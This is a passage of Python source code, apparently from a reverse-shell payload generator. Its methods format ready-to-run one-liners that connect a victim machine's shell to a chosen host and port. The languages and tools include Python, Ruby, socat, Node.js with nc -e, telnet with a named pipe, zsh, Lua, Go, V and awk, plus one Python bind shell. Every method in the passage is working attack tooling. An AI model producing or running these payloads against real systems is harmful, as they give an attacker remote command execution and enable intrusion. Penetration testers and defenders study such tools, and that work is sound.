                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def python_2(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def python_3_1(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "export RHOST=\"{}\";export RPORT={};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def python_3_2(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        elif self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_bind()['code'] == 200:
            try:
                self.__payload = "python3 -c \'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"{}\",{}));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def python3_shortest(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\"{}\",{}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def ruby(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "ruby -rsocket -e\'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{}\",{}))\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def ruby_nosh(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "ruby -rsocket -e\'exit if fork;c=TCPSocket.new(\"" + self.__target + "\",\"" + self.__port + "\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}\'"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def socat(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "socat TCP:{}:{} EXEC:/bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def socat_tty(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "socat TCP:{}:{} EXEC:\'/bin/bash\',pty,stderr,setsid,sigint,sane".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def nodejs(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "require(\'child_process\').exec(\'nc -e /bin/bash {} {}\')".format(self.__target,
                                                                                                     self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def telnet(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | /bin/bash 1>$TF".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def zsh(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "zsh -c \'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def lua(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "lua -e \"require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{}\',\'{}\');os.execute(\'/bin/bash -i <&3 >&3 2>&3\');\"".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def lua_2(self):
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "lua5.1 -e \'local host, port = \"{}\", {} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def golang(self):
        """
            Description: This payload support GNU/Linux Mac OSX, and Microsoft Windows
        """
        self.__prompt = self.__prompt_unix if (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()[
            'code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + self.__target + ":" + self.__port + "\");cmd:=exec.Command(\"" + self.__prompt + "\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def vlang(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "echo \'import os\' > /tmp/t.v && echo \'fn main() { os.system(\"nc -e /bin/bash " + self.__target + " " + self.__port + " 0>&1\") }\' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def awk(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "awk \'BEGIN {s = \"/inet/tcp/0/" + self.__target + "/" + self.__port + "\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status
